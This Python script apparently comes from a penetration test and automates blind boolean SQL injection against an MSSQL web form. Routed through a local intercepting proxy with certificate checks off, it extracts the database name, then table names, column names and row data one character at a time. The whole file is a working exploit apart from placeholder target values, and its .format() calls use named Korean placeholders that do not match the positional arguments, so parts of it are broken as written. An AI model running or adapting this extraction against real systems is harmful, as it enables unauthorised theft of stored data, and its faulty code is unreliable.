import requests
import urllib3
import os
import json
import time

proxy = '127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "C:\\Users\\K1220159\\Desktop\\프로젝트\\[230403-230428] 쿠콘" #인증서 위치

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "url 작성"
headers = {'Charset':'utf-8'}
cookies = {'JSESSIONID':'session ID'}

DB_Length = 0
DB_Name = ""
TABLE_Name = ""
COLUMN_Name = ""
Data = ""
Flag = 0

print("\033[92m"+"[*] start!!")

while True:
    payload = "[검색 가능한 문자열]' and ((case when len(db_name())={데이터베이스명 길이} then '1' else 0 end)='1') and '1%'='1".format(DB_Length)
    paylaod = payload.encode('utf-8')
    data = {"_JSON_": payload}
    r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
    if "[검색 가능한 문자열]" in r.text:
        break

    DB_Length += 1

print("\033[92m"+"[*] Database length:",DB_Length)

for i in range(1,DB_Length+1):
    for k in range(32,127) :
        payload = "[검색 가능한 문자열]' and ((case when ascii(substring(db_name(),{문자열 추출을 시작할 위치},1))={문자} then '1' else 0 end)='1') and '1%'='1".format(i,k)
        paylaod = payload.encode('utf-8')
        data = {"_JSON_": payload}
        r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)

        if "[검색 가능한 문자열]" in r.text:
            DB_Name += chr(k)
            break

print("[*] Database name:",DB_Name)

# 테이블 명 구하기
for j in range(1,1000):
    for i in range(1,100):
        for k in range(32,127) :
            # 문자열 확인
            payload = "[검색 가능한 문자열]' and ((case when ascii(substring((SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name ASC) AS row_num FROM information_schema.tables) subquery WHERE row_num = {추출하고자하는 테이블명 번호}),{문자열 추출을 시작할 위치},1)) = {문자} then '1' else 0 end )='1') and '1%' = '1".format(j,i,k)
            paylaod = payload.encode('utf-8')
            data = {"_JSON_": payload}
            r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
            time.sleep(0.1)
            if "[검색 가능한 문자열]" in r.text:
                TABLE_Name += chr(k)
                break
            # 문자열의 끝인지 확인
            if (k==126):
                Flag = 1  
        if(Flag == 1):
            break
    print("["+str(j)+"]table name:",TABLE_Name)
    Flag = 0
    # 테이블 이름 초기화
    TABLE_Name =""


# 컬럼 명 구하기
for j in range(1,50):
    for i in range(1,100):
        for k in range(32,127) :
            # 문자열 확인
            payload = "[검색 가능한 문자열]' and ((case when ascii(substring((SELECT column_name FROM (SELECT column_name,ROW_NUMBER() OVER (ORDER BY column_name ASC) AS row_num,table_name FROM information_schema.columns WHERE table_name = '[테이블명]') subquery WHERE row_num = {추출하고자하는 컬럼명 번호}),{문자열 추출을 시작할 위치},1)) = {문자} then '1' else 0 end )='1') and '1%' = '1".format(j,i,k)
            paylaod = payload.encode('utf-8')
            data = {"_JSON_": payload}
            r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
            time.sleep(0.1)
            if "[검색 가능한 문자열]" in r.text:
                print(chr(k))
                COLUMN_Name += chr(k)
                break
            # 문자열의 끝인지 확인
            if (k==126):
                Flag = 1  
        if(Flag == 1):
            break
    print("["+str(j)+"]column name:",COLUMN_Name)
    Flag = 0
    # 테이블 이름 초기화
    COLUMN_Name =""

#데이터 추출하기
for j in range(1,1000):
    for i in range(1,100):
        for k in range(32,127) :
            # 문자열 확인
            payload = "[검색 가능한 문자열]' and ((case when ascii(substring((SELECT [컬럼명] FROM (SELECT [컬럼명],ROW_NUMBER() OVER (ORDER BY [컬럼명]) AS row_num FROM [테이블명]) subquery WHERE row_num = {추출하고자하는 데이터 번호}),{문자열 추출을 시작할 위치},1)) = {문자} then '1' else 0 end )='1') and '1%' = '1".format(j,i,k)
            paylaod = payload.encode('utf-8')
            data = {"_JSON_": payload}
            r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
            time.sleep(0.1)
            if "[검색 가능한 문자열]" in r.text:
                print(chr(k))
                Data += chr(k)
                break
            # 문자열의 끝인지 확인
            if (k==126):
                Flag = 1  
        if(Flag == 1):
            break
    print("["+str(j)+"]Data:",Data)
    Flag = 0
    # 테이블 이름 초기화
    Data =""




        